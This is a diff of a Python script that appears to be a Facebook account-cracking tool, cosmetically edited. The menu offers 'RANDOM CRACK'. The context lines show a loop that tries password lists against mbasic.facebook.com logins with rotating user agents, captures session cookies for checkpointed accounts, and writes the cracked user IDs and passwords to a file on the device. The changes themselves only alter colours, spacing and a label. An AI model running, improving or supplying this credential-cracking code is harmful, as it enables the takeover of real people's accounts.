@@ -111,8 +111,8 @@ def DEVHISx():
 def Main():
         os.system("clear")
         print(logo)
-        print(" [1] RANDOM CRACK")
-        print(" [0] Exit")
+        print("\033[1;92m[1] RANDOM CRACK")
+        print("\033[1;92m[0] Exit")
         DEVHIS =input("\n [?] Choose : ")
         if DEVHIS in ["1","01"]:
             fuck()
@@ -164,7 +164,7 @@ def DEVHIS2(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write(f'\r\033[1;92m[RUNNING]▶[%s/%s]  [OK-%s] ~ [CP-%s] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.write(f'\r\033[1;92m[RUNNING]▶ [%s/%s]  [OK-%s] ~ [CP-%s] \r'%(loop,tl,len(oks),len(cps))),
             sys.stdout.flush()
             free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
@@ -208,7 +208,7 @@ def DEVHIS2(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                print(f"\033[1;94m[DEVHIS-CP] {cid} | {ps}")
+                print(f"\033[1;94m[LOCKED] {cid} | {ps}")
                 open('/sdcard/DEVHIS-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
